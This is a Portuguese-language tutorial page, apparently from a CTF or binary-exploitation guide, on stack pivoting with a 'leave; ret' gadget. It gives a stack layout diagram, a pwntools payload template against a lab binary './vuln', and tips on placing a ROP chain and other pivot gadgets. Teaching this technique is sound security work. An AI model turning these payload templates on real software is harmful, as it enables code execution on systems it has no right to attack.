---
title: "Stack Pivoting"
sidebar_position: 9
---

Quando só cabe o return address e pouco mais (overflow pequeno), movemos `rsp` para uma região que controlamos (`.bss` sem PIE, heap, ou um buffer maior) onde a chain inteira já está. Teoria em [Stack Pivoting](../../../pwning/stack/rop/stack-pivoting.mdx).

## leave; ret

O gadget mais comum é `leave; ret` (fim de qualquer função). `leave` = `mov rsp, rbp; pop rbp`, então o **`rbp` salvo** (logo antes do return address, que o overflow já alcança) vira o novo `rsp`.

```
[padding]
[RBP salvo]      = endereço da nova stack   (ex: elf.bss() + 0x100)
[return address] = gadget leave; ret

Nova stack: [8 bytes de lixo (vira rbp)] [chain ROP...]
```

```py
from pwn import *
elf = context.binary = ELF('./vuln')
rop = ROP(elf)
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
new_stack = elf.bss() + 0x100            # sem PIE; com PIE, precisa de leak

# 1. coloque a chain na nova stack (input que o programa já grava lá, ou um read antes)
chain = p64(0) + rop.chain()             # 8 bytes de lixo para o pop rbp do leave

# 2. pivot
payload = b'A' * (offset - 8) + p64(new_stack) + p64(leave_ret)
```

## Colocando a chain na nova stack

- O programa já lê algo para um buffer global/da heap: grave a chain lá.
- Senão, faça um mini-ROP com o que cabe: `read(0, bss, 0x200)` (ou `gets(bss)`) e depois o pivot para `bss`. `rop.migrate(addr)` do pwntools gera o pivot.
- Off-by-one no `rbp`: sobrescrever só o último byte do `rbp` salvo move a stack alguns bytes para dentro do seu próprio buffer, e o `leave; ret` seguinte executa a chain que está nele.

Outros gadgets de pivot: `pop rsp; ret`, `xchg rax, rsp; ret`, `add rsp, N; ret`. Depois do pivot, a stack costuma precisar de espaço livre **antes** de `rsp` (funções como `system` escrevem abaixo dele): deixe uns `0x100` bytes de folga em relação ao início da região.
